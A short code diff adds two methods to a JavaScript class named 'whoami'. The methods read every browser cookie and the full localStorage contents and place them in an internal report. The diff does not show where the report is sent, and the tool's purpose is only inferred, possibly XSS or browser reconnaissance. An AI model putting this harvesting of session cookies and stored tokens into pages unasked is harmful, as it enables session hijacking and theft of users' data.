@@ -57,6 +57,20 @@ class whoami {
     this._addReport('userContext', this.userContext);
   }
 
+  catchCookie() {
+    let cookies = {};
+    const pairs = document.cookie.split(';');
+    for (let i=0, len=pairs.length; i < len; i++) {
+      const pair = pairs[i].trim().split('=');
+      cookies[pair[0]] = unescape(pair[1]);
+    }
+    this._addReport('cookie', cookies);
+  }
+
+  catchLocalStorage() {
+    this._addReport('localStorage', localStorage);
+  }
+
 }
 
 
